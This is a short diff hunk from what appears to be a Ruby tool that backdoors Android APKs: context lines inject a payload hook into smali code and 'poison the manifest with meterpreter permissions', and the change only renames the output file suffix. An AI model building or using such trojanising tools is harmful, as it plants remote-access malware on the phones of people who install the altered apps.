@@ -219,7 +219,7 @@ hookedsmali = activitysmali.gsub(activitycreate, payloadhook)
 print "[*] Loading ",smalifile," and injecting payload..\n"
 File.open(smalifile, "w") {|file| file.puts hookedsmali }
 injected_apk=apkfile.split(".")[0]
-injected_apk+="_backdoored.apk"
+injected_apk+="_backdoored-hritik.apk"
 
 print "[*] Poisoning the manifest with meterpreter permissions..\n"
 fix_manifest()
